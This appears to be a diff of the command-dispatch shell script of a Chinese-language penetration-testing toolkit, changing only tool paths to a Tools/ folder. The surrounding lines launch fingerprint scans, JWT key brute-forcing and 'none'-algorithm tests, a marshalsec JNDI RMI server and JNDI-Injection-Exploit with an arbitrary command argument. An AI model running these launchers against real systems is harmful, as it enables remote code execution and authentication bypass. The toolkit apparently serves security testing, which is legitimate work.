@@ -388,11 +388,11 @@ killstruts2process)
 
 # EHole指纹识别（未启动代理）
 ehole_finger_scan)
-    /TIP/info_scan/EHole_linux_amd64/EHole_linux_amd64 finger -l /TIP/batch_scan_domain/url.txt | grep "\[" >/TIP/info_scan/result/ehole_finger.txt
+    /TIP/info_scan/Tools/EHole_linux_amd64/EHole_linux_amd64 finger -l /TIP/batch_scan_domain/url.txt | grep "\[" >/TIP/info_scan/result/ehole_finger.txt
     ;;
 # EHole指纹识别（启动代理）
 ehole_finger_scan_proxy)
-    /TIP/info_scan/EHole_linux_amd64/EHole_linux_amd64 finger -l /TIP/batch_scan_domain/url.txt -p socks5://127.0.0.1:10808 | grep "\[" >/TIP/info_scan/result/ehole_finger.txt
+    /TIP/info_scan/Tools/EHole_linux_amd64/EHole_linux_amd64 finger -l /TIP/batch_scan_domain/url.txt -p socks5://127.0.0.1:10808 | grep "\[" >/TIP/info_scan/result/ehole_finger.txt
     ;;
 
 # BBScan敏感信息扫描
@@ -1562,7 +1562,7 @@ start_jndi_python)
     ;;
 
 start_jndi)
-    cd /TIP/info_scan/jndi_server
+    cd /TIP/info_scan/Tools/jndi_server
     nohup java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://${ip_address}:9998/#TouchFile" 9999 >/TIP/info_scan/result/jndi_result.txt 2>&1 &
     echo "${jndi_result}"
     ;;
@@ -2020,12 +2020,12 @@ file_zip_oper)
 # jwt相关
 # 暴力破解密钥
 startjwtscanbykey)
-    python3 /TIP/info_scan/jwt_tool/jwt_tool.py  $2 -C -d /TIP/info_scan/dict/jwt_pass.txt > /TIP/info_scan/result/jwt_report.txt
+    python3 /TIP/info_scan/Tools/jwt_tool/jwt_tool.py  $2 -C -d /TIP/info_scan/dict/jwt_pass.txt > /TIP/info_scan/result/jwt_report.txt
 ;;
 
 # 签名算法可被修改为none
 startjwtscanbynone)
-    python3 /TIP/info_scan/jwt_tool/jwt_tool.py  $2 -X a > /TIP/info_scan/result/jwt_report.txt
+    python3 /TIP/info_scan/Tools/jwt_tool/jwt_tool.py  $2 -X a > /TIP/info_scan/result/jwt_report.txt
 ;;
 
 # JWT爆破运行状态
@@ -2041,7 +2041,7 @@ jwt_status)
 # JNDI-Injection-Exploit
 # 开启JNDI
 start_jndi_Injection-Exploit)
-    cd /TIP/info_scan/jndi_server
+    cd /TIP/info_scan/Tools/jndi_server
     nohup java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "$2" -A "$3" >/TIP/info_scan/result/jndi_Injection-Exploit.txt 2>&1 &
     ;;
 # JNDI运行状态
